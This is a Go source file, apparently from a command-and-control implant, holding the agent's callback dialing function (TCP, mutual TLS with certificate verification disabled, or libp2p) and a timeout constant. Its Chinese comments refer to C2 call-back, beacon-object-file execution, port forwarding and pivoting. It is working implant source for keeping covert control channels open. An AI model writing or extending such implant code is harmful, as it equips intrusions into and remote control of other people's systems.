package main

import (
	"crypto/tls"
	"crypto/x509"
	"net"
	"time"

	"gopher/utils"
)

// DialProfile 把改造前散在 6 处的回连拨号逻辑收成一处，**逐点行为等价**：
//
//	UseSSL == false → 裸 TCP
//	UseSSL == true  → TLS（自签 CA + 客户端证书）。`InsecureSkipVerify: true` 是
//	                  原样搬过来的，不是笔误 —— 对端是自签证书，链校验本来就不成立。
//
// ★ 证书加载失败与拨号失败**合并**成一个 error，且不影响等价性（6 个点逐个核过）：
//   - 站点 1/2/3：两条失败路径在原代码里走的就是同一个收尾（站点 3 两条都调 procCancel）；
//   - 站点 4/5：原代码里证书失败是**裸 return**（不 Close，因为连接还没建立）。合并后
//     调用点先做 nil 判断 ⇒ 证书失败时 conn 为 nil ⇒ 跳过 Close ⇒ 与原样一致。
//     ★ 顺带修掉 `net.Dial` 失败时对 **nil 接口**调 Close() 的 panic（tasks.go 原 1313）；
//   - 站点 6（main.go）：两条路径都是 `continue`，重试下一个地址。
//
// 返回的 error 非 nil 时，conn 必为 nil —— ★ 这条契约由**本函数**保证，不是调用方
// 的假设：TLS 分支失败时返回的是 `(*tls.Conn)(nil)`，直接返回会让接口非 nil（见那里的
// 归一）。调用点 tasks.go:1286 正是依赖这条契约做 `if conn != nil`。
//
// ★ 传输分派（Phase5 §4 步骤 4）：`Transport == "libp2p"` 时走 dialLibp2p，
//
//	它由 build tag 决定是**真实现**还是**替身**（见 transport_libp2p.go /
//	transport_nolibp2p.go，以及 §4.2 的决策）。`Transport == ""`（旧 profile）⇒ TCP，
//	与改造前逐字相同。
//	★ libp2p 分支**不套 TLS**：Noise 已经提供了加密与对端认证，再叠一层 TLS 只会
//	  增加握手延迟和签名面，不增加任何安全性。该分支下 profile.UseSSL 被忽略。
func DialProfile(profile utils.Profile, addr string) (net.Conn, error) {
	if profile.Transport == "libp2p" {
		return dialLibp2p(profile, addr)
	}
	if !profile.UseSSL {
		return net.DialTimeout("tcp", addr, axBackDialTimeout)
	}

	cert, err := tls.X509KeyPair(profile.SslCert, profile.SslKey)
	if err != nil {
		return nil, err
	}

	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(profile.CaCert)

	config := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		InsecureSkipVerify: true,
	}
	c, err := tls.DialWithDialer(&net.Dialer{Timeout: axBackDialTimeout}, "tcp", addr, config)
	if err != nil {
		// ★ 归一成**真 nil 接口**（否则违反文件头那条契约，见那里的说明）。
		//   这不是防御性代码：调用点 tasks.go:1286 正是靠"err 非 nil ⇒ conn 为 nil"
		//   来决定跳不跳过 Close 的。
		return nil, err
	}
	return c, nil
}
// axBackDialTimeout 是 agent 主动拨回 C2 的**上界**（M8②/M8③ 是同一个根）。
//
// ★ 修的是什么：`net.Dial` / `tls.Dial` 都**没有超时** —— 内核 SYN 重传的上界
//   （约 130s）就是这条路径的上界。而 jobRun / jobDownloadStart / jobExecBofAsync
//   三个 job 是在**命令协程上同步拨号**的：只要目标侧黑洞，整条命令通道就被占住
//   两分多钟 —— 连 kill 都发不进去。
// ★ 10s 是**上界**不是目标：正常拨号毫秒级返回。取 10s 而非 pivot 用的 3s，是给
//   跨国慢链路留余量。
// ★ 刻意**不把三个 job 改成异步拨号**：那会让返回值从"已启动/启动失败"退化成
//   "永远说已启动"，把拨号失败变成**静默失败** —— 正是 rportfwd 上踩到的那个坑。
//   有界 + 保持同步：既解开命令协程，又不丢失败信号。
// ★ libp2p 分支不吃这个值：它有自己可配的预算（profile.Libp2pDialTimeout，
//   默认 30s），Noise 握手 + 选路本来就比裸 TCP 慢。
const axBackDialTimeout = 10 * time.Second
